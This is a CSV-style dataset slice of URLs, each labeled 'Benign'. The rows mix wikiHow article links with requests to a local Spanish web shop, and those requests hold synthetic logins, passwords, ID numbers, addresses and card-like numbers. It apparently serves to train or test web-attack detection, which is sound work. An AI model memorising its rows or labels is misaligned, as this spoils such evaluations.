http://www.wikihow.com/make-black-hair-grow&t=1396592903000&n=3856551&k=mainentity,Benign
http://www.wikihow.com/enjoy-reality-tv-to-the-max&t=1396632777316&n=5509264&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sonnnie&password=8n6s17d741a49e&nombre=sempronio&apellidos=dawaher&email=ormeny%40nuestrasantacruz.yu&dni=79198226a&direccion=camino+viejo+nazaret%2c+102%2c+&ciudad=bl%e1zquez%2c+los&cp=35637&provincia=lugo&ntc=6095067827463299&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=anders&password=pronuncia&nombre=teofan%eda&apellidos=canulli+petit&email=pennock%40ebuy.com.fo&dni=99817663d&direccion=san+luis+gonzaga%2c+66%2c+&ciudad=gondomar&cp=46870&provincia=valladolid&ntc=9878989785632968&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=papa&password=articulada&nombre=werner&apellidos=belis&email=housemann%40magichobby.lu&dni=16052504e&direccion=c%2f+almedina+197+&ciudad=fuentearmegil&cp=18800&provincia=segovia&ntc=2428414679876980&b1=registrar,Benign
http://www.wikihow.com/be-good-at-nazi-zombies&t=1396649312598&n=5998527&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shoshann&pwd=3u6o73s0&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidad=64&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-fairy-repellent-from-the-dork-diaries&t=1396528432209&n=881513&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=35&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/learn-about-shinto-deities&t=1396570230769&n=2938321&k=mainentity,Benign
http://www.wikihow.com/teach-your-puppy-to-%22give-paw%22&t=1396516719461&n=267868&k=mainentity,Benign
http://www.wikihow.com/make-a-liquid-moisturizer-with-milk&t=1396593521866&n=3892744&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schaap&password=3apelil07&nombre=jes%fas&apellidos=picanyol+ciur%f3&email=clutesi.kember%40messadivoce.gu&dni=73103940g&direccion=plza.+misael+ba%f1uelos+garcia%2c+52+11f&ciudad=numancia+de+la+sagra&cp=06480&provincia=barcelona&ntc=8987921521222583&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carran&password=pinganillo&nombre=rudolfo&apellidos=andradas+rosano&email=kartal%40elpaisaje.km&dni=47815627f&direccion=mu%f1ico+53%2c+10%3fc&ciudad=sauzal%2c+el&cp=40541&provincia=tarragona&ntc=9901505032953816&b1=registrar,Benign
http://www.wikihow.com/get-rid-of-wavy-hair&t=1396593131781&n=3869623&k=mainentity,Benign
http://www.wikihow.com/make-bhel&t=1396526963535&n=811648&k=mainentity,Benign
http://www.wikihow.com/care-for-dying-plants&t=1396561517630&n=2494648&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidad=3&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=galipeau&password=c3nduct9ro&nombre=florentina&apellidos=clua+conoto&email=paddick2%40softwaresaas.rs&dni=68441045z&direccion=calle+jaume+torres%2c+196%2c+&ciudad=ugao-miraballes&cp=41400&provincia=guadalajara&ntc=4418028945212050&b1=registrar,Benign
http://www.wikihow.com/get-a-copy-of-ubuntu-linux-shipped-to-you-for-free&t=1396610610426&n=4721918&k=mainentity,Benign
http://www.wikihow.com/create-an-islamic-home&t=1396570061675&n=2931533&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1373&b1=confirmar,Benign
http://www.wikihow.com/make-whisky-log&t=1396610304947&n=4706118&k=mainentity,Benign
"http://www.wikihow.com/create-a-good-strategy-for-warcraft-1,-2,-and-3&t=1396648620148&n=5974815&k=mainentity",Benign
http://www.wikihow.com/electrical-testing-alderley-edge&t=1396562565081&n=2556780&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hartgrov6&pwd=aneo1a&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=josselyn&password=p0ost%e9tico&nombre=aim%f3n&apellidos=esquivel+soguero&email=wilcoxon%40culturalsanpedrocf.dz&dni=32158802h&direccion=c%2f+fernando+diaz+de+mendoza%2c+0+7-h&ciudad=valtajeros&cp=31219&provincia=girona&ntc=5947260315121490&b1=registrar,Benign
http://www.wikihow.com/recognize-when-i%27m-getting-argumentative&t=1396532330778&n=1060258&k=mainentity,Benign
http://www.wikihow.com/apply-for-professional-airbnb-photos&t=1396629413363&n=5418493&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=basu&password=esca29ido71&nombre=malinda&apellidos=taulats+ovejero&email=dench%40hojainformativa.com.yu&dni=79928493c&direccion=guadarrama%2c+92%2c+12b&ciudad=santa+pola&cp=19442&provincia=%c1vila&ntc=3324296387764871&b1=registrar,Benign
http://www.wikihow.com/place-drinks-on-a-serving-tray&t=1396517183719&n=298001&k=mainentity,Benign
http://www.wikihow.com/have-a-large-repertoire-of-songs-to-perform-and-sing&t=1396632669801&n=5505648&k=mainentity,Benign
http://www.wikihow.com/get-far-in-call-of-duty:-world-at-war:-nazi-zombies&t=1396649315195&n=5998651&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=eskildse&password=l12o3o&nombre=turquesa&apellidos=tona+manresa&email=dina%40cementoscalibra.py&dni=22933102d&direccion=pereda%2c+126%2c+&ciudad=ausejo+de+la+sierra&cp=42132&provincia=c%e1diz&ntc=4067676531310167&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brownlie&password=cosa&nombre=valdo&apellidos=del+moral+calera&email=tannen%40getgold.ua&dni=41998642k&direccion=camino+berriz+164+&ciudad=sotorribas&cp=12350&provincia=%c1vila&ntc=9165929782828582&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=latulipp&password=t34perat9sima&nombre=abercio&apellidos=zuya+oca%f1a&email=brenner%40campanasextractoras.cy&dni=94513424f&direccion=pasillo+santo+domingo%2c+87%2c+&ciudad=berat%f3n&cp=45180&provincia=ourense&ntc=5827003199466827&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=94&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/transfer-data-from-opencart-to-magento-using-cart2cart&t=1396533895449&n=1134001&k=mainentity,Benign
http://www.wikihow.com/make-yogurt-berry-muffins&t=1396595229089&n=3983871&k=mainentity,Benign
http://www.wikihow.com/connect-sony-ps4-with-mobile-phones-and-portable-devices&t=1396533419149&n=1112281&k=mainentity,Benign
http://www.wikihow.com/deal-with-a-flirtatious-boy-when-you-don%27t-desire-a-relationship&t=1396612182810&n=4778930&k=mainentity,Benign
http://www.wikihow.com/make-a-fairy-headband&t=1396528411365&n=879489&k=mainentity,Benign
http://www.wikihow.com/have-a-meaningful-experience-at-deviantart&t=1396629402544&n=5417949&k=mainentity,Benign
http://www.wikihow.com/highlight-passages-in-a-book-on-a-kindle-2&t=1396633274463&n=5521785&k=mainentity,Benign
http://www.wikihow.com/charge-a-kindle-connected-to-ubuntu&t=1396610588693&n=4720986&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=urow&password=ecl%e9ctica&nombre=zoila&apellidos=lupia%f1ez+guamanzara&email=carroll%40923.am&dni=21555490m&direccion=calle+salines%2c+s%2fn+&ciudad=arbo&cp=25236&provincia=castell%f3n&ntc=4675506970128190&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ursula&pwd=09na1832*8&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-a-(fake)-tv-channel-to-share-with-friends&t=1396610673638&n=4724978&k=mainentity,Benign
http://www.wikihow.com/help-a-friend-who-has-been-kicked-out-by-his/her-parents&t=1396571412648&n=2987333&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9764&b1=confirmar,Benign
http://www.wikihow.com/create-an-animal-jam-warrior&t=1396648259020&n=5958515&k=mainentity,Benign
http://www.wikihow.com/tame-your-curly-frizzy-hair&t=1396593239840&n=3875768&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=935&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=fayez&pwd=gemiquear&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8570&b1=pasar+por+caja,Benign
http://www.wikihow.com/have-a-hotel-party-for-your-13th-birthday-(girls)&t=1396546879029&n=1730056&k=mainentity,Benign
http://www.wikihow.com/be-a-complete-nutter&t=1396526512544&n=787791&k=mainentity,Benign
http://www.wikihow.com/make-alcohol-shots&t=1396517233987&n=300113&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=46&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/plan-a-weekend-break-with-3-kids&t=1396630615227&n=5461398&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2847&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2761&b1=pasar+por+caja,Benign
http://www.wikihow.com/cope-with-a-friend-moving-away&t=1396571710245&n=2998361&k=mainentity,Benign
http://www.wikihow.com/prepare-dirt-for-a-garden&t=1396561606713&n=2499036&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hardyman&pwd=oce5430&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-black-forest-sauce&t=1396515727377&n=210229&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=linback&password=nictag%edneo&nombre=gustavo&apellidos=lluma+vallb%f3&email=tabernero%40sexotelefono.la&dni=16254106y&direccion=ruperto+gomez+de+segura%2c+8+9f&ciudad=cubillo+del+campo&cp=40213&provincia=segovia&ntc=8203497513410031&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=addison&pwd=s17tari70%2b2&remember=off&b1=entrar,Benign
http://www.wikihow.com/manage-your-yelp-public-profile-information&t=1396629607596&n=5425933&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=14&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/properly-open-a-swimming-pool&t=1396564012863&n=2647354&k=mainentity,Benign
http://www.wikihow.com/fix-the-arm-base-of-a-syncro-braun-7000-series-cleaning-base&t=1396532781348&n=1080812&k=mainentity,Benign
http://www.wikihow.com/file-auto-insurance-claims&t=1396613279761&n=4812475&k=mainentity,Benign
http://www.wikihow.com/pick-up-a-blind-person&t=1396570673138&n=2956681&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5431&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mendolia&password=geof%edsica&nombre=benjam%edn&apellidos=montesdeoca&email=botiller%40acch-portugal.kr&dni=52509626m&direccion=cuesta+del+carro%2c+114+&ciudad=viloria&cp=06132&provincia=navarra&ntc=4597794127827518&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tjia&password=barbite%f1ida&nombre=malias&apellidos=del+solo+abaroa&email=nazmi_reusse%40yiutuve.ge&dni=07603045g&direccion=c%2f+isaac+albeniz+41%2c+&ciudad=fresno+del+r%edo&cp=29370&provincia=salamanca&ntc=3150534950887610&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5483&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=redding&password=ma3sind78&nombre=reeve&apellidos=astorga+nadeix&email=behmer_damiani%40barebackspain.za&dni=98213117n&direccion=travesa+altamira+104+&ciudad=cru%eflles%2c+monells+i+sant+sadurn%ed+de+l%27heura&cp=36790&provincia=salamanca&ntc=8341391100531501&b1=registrar,Benign
http://www.wikihow.com/check-the-version-of-your-mac&t=1396533215025&n=1103512&k=mainentity,Benign
http://www.wikihow.com/have-fun-at-adventure-island&t=1396527912053&n=853077&k=mainentity,Benign
http://www.wikihow.com/make-olive-oil-night-cream&t=1396593970148&n=3916688&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=692&b1=confirmar,Benign
http://www.wikihow.com/rehearse-auditions-with-a-partner&t=1396632759824&n=5508780&k=mainentity,Benign
http://www.wikihow.com/change-your-ip-address-with-snow-leopard&t=1396610712289&n=4726814&k=mainentity,Benign
http://www.wikihow.com/make-cheese-omelet-on-harvest-moon:-animal-parade&t=1396649557653&n=6008058&k=mainentity,Benign
http://www.wikihow.com/dress-as-a-comedian&t=1396517952243&n=352462&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidad=57&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/log-onto-linkedin&t=1396629985323&n=5441585&k=mainentity,Benign
http://www.wikihow.com/log-out-of-youtube&t=1396630148802&n=5448349&k=mainentity,Benign
http://www.wikihow.com/have-a-bikini-costume-party&t=1396546932037&n=1732532&k=mainentity,Benign
http://www.wikihow.com/make-whole-wheat-banana-bread-mini-muffins&t=1396595228186&n=3983803&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=besson&password=712b8o301s&nombre=albana&apellidos=pinart+gusta&email=parmeggiani%40shamballa-es.fj&dni=86164975y&direccion=estornino+181+&ciudad=deleitosa&cp=22530&provincia=cuenca&ntc=7771328915224191&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yuhjiun&pwd=remo7lero&remember=on&b1=entrar,Benign
http://www.wikihow.com/make-a-kids-teepee&t=1396631216204&n=5476920&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=xpmbuild&pwd=exc971%2bbl5&remember=on&b1=entrar,Benign
http://www.wikihow.com/stop-unwanted-flirting&t=1396609887338&n=4697500&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cherenso&pwd=mi.rtina&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-an-indian-spice-and-yogurt-scrub&t=1396632300209&n=5500206&k=mainentity,Benign
http://www.wikihow.com/have-a-romantic-date-without-going-out&t=1396570801505&n=2961833&k=mainentity,Benign
http://www.wikihow.com/style-black-hair&t=1396594628882&n=3942079&k=mainentity,Benign
http://www.wikihow.com/make-lemon-ginger-syrup&t=1396545785254&n=1661476&k=mainentity,Benign
"http://www.wikihow.com/make-a-facial-scrub-with-sugar,-oil-and-cocoa-powder&t=1396593326477&n=3880684&k=mainentity",Benign
http://www.wikihow.com/take-care-of-your-18-inch-dolls-hair&t=1396516487495&n=255466&k=mainentity,Benign
http://www.wikihow.com/migrate-content-from-drupal-to-joomla&t=1396533855468&n=1132609&k=mainentity,Benign
http://www.wikihow.com/build-a-pig-cannon-in-minecraft&t=1396648428302&n=5965383&k=mainentity,Benign
http://www.wikihow.com/make-life-exiting&t=1396569929648&n=2926537&k=mainentity,Benign
http://www.wikihow.com/install-a-cd/dvd-rom-into-an-ibm/windows-pc&t=1396611320934&n=4750901&k=mainentity,Benign
http://www.wikihow.com/stop-dog-farming&t=1396516716016&n=267780&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=khatri&password=b%cdceps&nombre=nanda&apellidos=balart+freydig&email=nocki%40muchapolicia.cn&dni=59399847r&direccion=plazoleta+churruca%2c+143%2c+4%3fa&ciudad=negrilla+de+palencia&cp=22591&provincia=teruel&ntc=4239160102094172&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=burgette6&password=desi%f1o&nombre=rosario&apellidos=almato+fit%f3&email=potokar.kino%40epbx.ua&dni=78677671f&direccion=escultura%2c+s%2fn%2c+3d&ciudad=milano%2c+el&cp=22550&provincia=%c1vila&ntc=3744912976180571&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dante&password=sil6s5ana&nombre=edrian&apellidos=seisdedos&email=celinska.duang%40ringringrent.uk&dni=93555373k&direccion=rafael+lopez%2c+27+&ciudad=villasdardo&cp=44114&provincia=salamanca&ntc=9372683635367680&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=levasseu&password=f*ino&nombre=espartaco&apellidos=porlier+goyenaga&email=alexandre%40classroommanager.au&dni=39446407g&direccion=plza.+circular+s%2fn+9-e&ciudad=cerecinos+del+carrizal&cp=26372&provincia=ja%e9n&ntc=2990423543833590&b1=registrar,Benign
http://www.wikihow.com/find-a-reputable-dog-breeder&t=1396516695700&n=267120&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fairlie&password=.asurcado&nombre=marco&apellidos=losada+costajuss%e0&email=zwerenz%40guejosgratis.mt&dni=14170192f&direccion=calle+ramon+servera+moya%2c+165%2c+8-b&ciudad=gomesende&cp=37770&provincia=barcelona&ntc=2304911329453006&b1=registrar,Benign
http://www.wikihow.com/play-music-on-itunes-while-a-macbook-pro-is-closed&t=1396533262562&n=1105537&k=mainentity,Benign
http://www.wikihow.com/create-an-infinite-water-supply-in-minecraft&t=1396648462924&n=5967231&k=mainentity,Benign
http://www.wikihow.com/write-poetry-to-young-children-which-they%27ll-love&t=1396609500521&n=4683481&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=724&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-banana-pudding-squares&t=1396515728368&n=210281&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=walpole&pwd=6a6050ar&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nadim&password=contraveniente&nombre=thiara&apellidos=lavanderos+casagran&email=backlin-scott-thomas%40lettere.im&dni=85342254h&direccion=carril+serreria%2c+78+5-a&ciudad=ullastrell&cp=24358&provincia=valladolid&ntc=8351548160650420&b1=registrar,Benign
http://www.wikihow.com/be-a-good-medic-at-call-of-duty-3&t=1396649186806&n=5992627&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5088&b1=confirmar,Benign
http://www.wikihow.com/care-for-your-lawn-over-winter&t=1396563558081&n=2620678&k=mainentity,Benign
http://www.wikihow.com/change-your-windows-password-when-you-cannot-log-in&t=1396611047939&n=4741777&k=mainentity,Benign
http://www.wikihow.com/get-cute-waves-in-under-24-hours&t=1396593118475&n=3868855&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wilcox&password=c2n87n&nombre=yamari&apellidos=borbonio+antonioli&email=stinehart_rigas%40sierradealcaraz.pr&dni=76322755s&direccion=lince%2c+36+12%3fg&ciudad=mues&cp=08460&provincia=zaragoza&ntc=0968269656631790&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85&cantidad=93&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=36&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/go-pro-on-girlsense&t=1396648164371&n=5954091&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jodee56&password=hom%f3gra*fo&nombre=mardo&apellidos=casc%e1rriez+valldeperas&email=mcdougal%40fichajes.nom.yu&dni=98051441a&direccion=cisneros%2c+s%2fn+&ciudad=pelahust%e1n&cp=46870&provincia=teruel&ntc=3742387438477895&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=caridad&pwd=r1m2samente&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lemaire&password=serpent%edgero&nombre=leonela&apellidos=fari%f1as+castells&email=january%40youtubeanunciox.ne&dni=93042317a&direccion=alcalde+gutierrez+ceballos%2c+107+&ciudad=villar+del+rey&cp=37429&provincia=burgos&ntc=7057085225551065&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4171&b1=pasar+por+caja,Benign
http://www.wikihow.com/apply-shadows-to-the-face&t=1396593879565&n=3912384&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=isabell7&pwd=ca6eado&remember=on&b1=entrar,Benign
http://www.wikihow.com/save-money-on-surety-bonds&t=1396613401469&n=4816787&k=mainentity,Benign
http://www.wikihow.com/tips-to-make-your-characters-dialogue-sound-natural&t=1396632860056&n=5511568&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eleen&password=recie.nte&nombre=i%f1aki&apellidos=di+giorgi+kohls&email=hamamura.quick%40coachingevolutivo.mw&dni=21010986a&direccion=capitan+cortes%2c+77%2c+2%3fg&ciudad=muel&cp=34760&provincia=albacete&ntc=9093378174743331&b1=registrar,Benign
"http://www.wikihow.com/make-a-quirky,-toppling-flower-pot-display&t=1396561970921&n=2520740&k=mainentity",Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=daley&password=5686ia9&nombre=demetria&apellidos=dengra&email=junkin%40miquelmartin.ug&dni=95645025p&direccion=glorieta+sevilla%2c+136+8-a&ciudad=navalilla&cp=09268&provincia=c%e1ceres&ntc=1947812242868438&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lindquis&password=rectamente&nombre=iohanna&apellidos=john+cook&email=young-sun%40hangarinmobiliaria.cl&dni=92162042f&direccion=las+cercas+153%2c+6-h&ciudad=barcial+del+barco&cp=50529&provincia=huesca&ntc=7960814832817294&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=blatherw0&password=vallejuelo&nombre=abinahil&apellidos=sixtos+llabot&email=pearson.lesley%40webhut.br&dni=42293325m&direccion=calle+barrio+de+la+bra%f1a+136+7-e&ciudad=pobla+de+benifass%e0%2c+la&cp=49541&provincia=m%e1laga&ntc=1260473774275985&b1=registrar,Benign
http://www.wikihow.com/befriend-your-brother%27s-friend&t=1396571475285&n=2989545&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=marquez6&pwd=embroca&remember=on&b1=entrar,Benign
http://www.wikihow.com/plan-a-stuffed-animal-class-party&t=1396546908121&n=1731628&k=mainentity,Benign
http://www.wikihow.com/get-a-girl-to-like-you-in-a-few-months&t=1396612074468&n=4774342&k=mainentity,Benign
http://www.wikihow.com/make-coconut-pie-with-mango-coulis&t=1396515818621&n=218017&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cobley&pwd=e0%21ergencia&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maycock&password=deuto&nombre=licia&apellidos=chareun+natal%edas&email=hume-kendall%40manuelpaloma.tf&dni=19393133q&direccion=calle+poeta+tabares+bartlet+s%2fn+11%3fa&ciudad=aranguren&cp=25185&provincia=soria&ntc=1832715857867757&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pollinzi&password=man036a9&nombre=nair&apellidos=salabert+lillo&email=besozzi%40universla.ar&dni=41635094b&direccion=calle+san+nicolas%2c+162+&ciudad=corbins&cp=02410&provincia=toledo&ntc=6876502276680883&b1=registrar,Benign
http://www.wikihow.com/get-points-and-simoleons-on-the-sims-freeplay&t=1396648715930&n=5979219&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=91&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6421&b1=confirmar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=elicia&password=seisena&nombre=edgar&apellidos=gaspar&email=haudepin%40waterflyesp.se&dni=10327366k&direccion=paseabide+ardekoa+5%2c+6%3fc&ciudad=canal+de+berd%fan&cp=49148&provincia=huesca&ntc=1723550006148792&b1=registrar,Benign
http://www.wikihow.com/get-the-alien-blaster-in-fallout:-new-vegas&t=1396649420718&n=6002811&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kirt&password=v548uos5&nombre=ante&apellidos=espada+junqu%e9&email=kydd.siddone%40hojainformativa.com.mm&dni=09569639y&direccion=centre+9%2c+3e&ciudad=neda&cp=08186&provincia=soria&ntc=8772164486474313&b1=registrar,Benign
http://www.wikihow.com/buy-a-book-to-read-on-vacation&t=1396527749675&n=845661&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=24&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carry&password=amo80d0ra&nombre=math%edas&apellidos=peleij%e0+marcapura&email=gorenson%40bloodline.tk&dni=61085988n&direccion=isabel+pantoja+16%2c+13g&ciudad=sagrada%2c+la&cp=10393&provincia=lleida&ntc=9263586426997442&b1=registrar,Benign
http://www.wikihow.com/turn-on-the-wireless-radio&t=1396533079808&n=1097116&k=mainentity,Benign
http://www.wikihow.com/cook-chicken-in-lotha-nagaland-style&t=1396547129516&n=1742632&k=mainentity,Benign
http://www.wikihow.com/buy-a-fashionable-power-bank-phone-charger&t=1396533483874&n=1115469&k=mainentity,Benign
http://www.wikihow.com/use-vimeo-in-windows-8&t=1396611471062&n=4754273&k=mainentity,Benign
http://www.wikihow.com/host-a-dinner-party-with-guests-holding-opposing-political-views&t=1396546633718&n=1716372&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=82&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/prevent-chafing&t=1396593974640&n=3916984&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=87&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/create-abstract-art-with-pd-howler&t=1396630452940&n=5458131&k=mainentity,Benign
http://www.wikihow.com/decorate-a-bedroom-using-pillows&t=1396562046677&n=2524892&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=stjohn&password=4u56m49rg69sa&nombre=hildegarda&apellidos=fijo+yax&email=godinez%40saavedradiaz.lk&dni=50026753m&direccion=pl.+peron%2c+109+&ciudad=castroserna+de+abajo&cp=02327&provincia=guadalajara&ntc=2516408741722266&b1=registrar,Benign
http://www.wikihow.com/get-a-boyfriend-in-year-7&t=1396611993872&n=4771186&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7413&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4484&b1=confirmar,Benign
http://www.wikihow.com/do-your-makeup-like-eleanor-calder&t=1396593883816&n=3912512&k=mainentity,Benign
http://www.wikihow.com/make-salsa-fresca&t=1396613982630&n=4839944&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3205&b1=pasar+por+caja,Benign
http://www.wikihow.com/register-mitel-ip-telephones&t=1396533340951&n=1108809&k=mainentity,Benign
http://www.wikihow.com/grow-a-letter&t=1396561953243&n=2519544&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=citarell&password=6iv196&nombre=huen%fa&apellidos=taffanelli+kohls&email=rosar%40comercioenlacalle.kp&dni=22188176f&direccion=doctor+cazalla+s%2fn%2c+&ciudad=valle+de+santa+ana&cp=04280&provincia=ciudad+real&ntc=4407558186625721&b1=registrar,Benign
http://www.wikihow.com/prepare-camping-checklist&t=1396630998105&n=5469449&k=mainentity,Benign
http://www.wikihow.com/convert-your-crush-to-your-religion&t=1396569986836&n=2928861&k=mainentity,Benign
http://www.wikihow.com/make-a-tarptent-out-of-a-bunkbed&t=1396562090344&n=2527116&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ouellett2&password=radicalmente&nombre=ranquel&apellidos=orra&email=hodo%40deltamarina.my&dni=18518539c&direccion=fructuoso+alvarez%2c+55+&ciudad=bay%e1rcal&cp=17742&provincia=palencia&ntc=3322562441567993&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hanham1&password=4aj9ble&nombre=kassandra&apellidos=elespuru&email=sovic%40a2hotels.sj&dni=22562718v&direccion=camino+de+humanes%2c+43+9%3fb&ciudad=monsalupe&cp=03794&provincia=girona&ntc=0825075702605085&b1=registrar,Benign
"http://www.wikihow.com/check-installed-software-in-linux,-steps-with-images&t=1396533106770&n=1098180&k=mainentity",Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=channen&pwd=ve0tol.a&remember=on&b1=entrar,Benign
